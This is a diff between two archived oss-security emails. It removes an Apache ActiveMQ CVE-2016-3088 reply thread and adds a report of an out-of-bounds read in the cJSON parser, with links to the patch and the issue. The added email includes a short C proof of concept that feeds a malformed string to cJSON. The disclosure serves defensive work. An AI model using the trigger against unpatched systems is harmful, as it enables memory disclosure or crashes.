@@ -1,58 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/24/6
-Message-ID: <CAGeh-pFfPXUX8XpUAJt5n6=qvoAr82ubN97BxE4a44o79tCudg@mail.gmail.com>
-Date: Tue, 24 May 2016 14:17:48 +0200
-From: Dejan Bosanac <dejan@...httale.net>
-To: "users@...ivemq.apache.org" <users@...ivemq.apache.org>
-Cc: "dev@...ivemq.apache.org" <dev@...ivemq.apache.org>,  Apache Security Response Team <security@...che.org>, bugtraq@...urityfocus.com,  oss-security@...ts.openwall.com
-Subject: Re: [ANNOUNCE] CVE-2016-3088: ActiveMQ Fileserver web application vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/02/2
+Message-ID: <CAFkTriK94p6uR1j3fznZpOXVa+vOa7tLSvSMgGEDSgin7_bhMg@mail.gmail.com>
+Date: Sun, 2 Oct 2016 20:06:25 +0800
+From: Marco Grassi <marco.gra@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: cve-assign@...re.org
+Subject: cJSON buffer out of bound read
 Content-Type: text/plain; charset=utf-8
 
-Hi Tim,
+Hi,
 
-it’s an omission. The feature will be completely removed with 5.14.0 and
-it’s been disabled by default since 5.12.0, so 5.13.x broker that haven’t
-this feature turn on explicitly are not vulnerable.
+I would like to report a buffer out of bound read problem in cJSON, which
+is a embeddable JSON parser, used (I imagine) in embedded devices, or even
+bigger stuff like the ps4 (
+http://doc.dl.playstation.net/doc/ps4-oss/cjson.html).
 
-I’ll fix the announcement now to say 5.13.x so it’s future proof in case of
-new 5.13 branch releases
+patch:
+https://github.com/DaveGamble/cJSON/commit/94df772485c92866ca417d92137747b2e3b0a917
 
-Regards
---
-Dejan Bosanac
-about.me/dejanb
+issue:
+https://github.com/DaveGamble/cJSON/issues/30
 
-On Tue, May 24, 2016 at 2:09 PM, Tim Bain <tbain@...mni.duke.edu> wrote:
+Poc with the malformed string
 
-> Does the range of versions specified mean that the issue is already
-> addressed in 5.13.3, or was its omission from the range an oversight?
->
-> Tim
-> On May 24, 2016 2:41 AM, "Dejan Bosanac" <dejan@...httale.net> wrote:
->
-> > There's a security vulnerability reported against Apache
-> > ActiveMQ 5.13.2 and older versions.
-> >
-> > Please check the following document and see if you’re affected by the
-> > issue.
-> >
-> >
-> >
-> http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt
-> >
-> > Vulnerability is similar to the one reported in CVE-2015-1830 (
-> >
-> >
-> http://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt
-> > ).
-> > The fileserver web application will be removed in 5.14.0 release and
-> users
-> > are advised not to use it and disable it in older versions.
-> >
-> > Regards
-> > --
-> > Dejan Bosanac
-> > about.me/dejanb
-> >
->
+#include <stdio.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include "cJSON.h"
+
+static const char *my_json = "\"000000000000000000\\";
+
+int main(int argc, const char * argv[]) {
+    cJSON * root = cJSON_Parse(my_json);
+    char * rendered = cJSON_Print(root);
+    printf("%s\n", rendered);
+    return 0;
+}
+
+thanks
+
+Marco
 
